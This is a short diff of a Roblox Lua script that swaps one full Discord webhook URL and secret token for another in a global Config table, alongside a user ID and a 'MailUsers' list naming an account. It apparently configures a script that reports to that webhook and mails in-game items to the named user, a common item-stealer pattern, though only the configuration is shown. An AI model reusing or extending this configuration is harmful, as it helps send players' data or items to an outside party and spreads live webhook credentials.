@@ -1,7 +1,7 @@
 repeat wait() until game:IsLoaded()
 task.spawn(function()
 getgenv().Config = {
-    ["Webhook"] = "https://discord.com/api/webhooks/1257100198069669980/jdJvJucEdRBbnO0lhcgQ_WrWdu832KfT0y6CuKoWPAuvLRlr9U6S0DX3tu864Ex8RfwE",
+    ["Webhook"] = "https://discord.com/api/webhooks/1326611353187647541/Aqms9Ilfv4l6JGRKy9jUmGtUoEWUOACxzMgKrUXMaoYUaAr0bXmQvQVyn1hCkbYRUPXw",
     ["UserID"] = "484739592239579136",
     ["MailUsers"] = {"DespacitoCross"},
 }
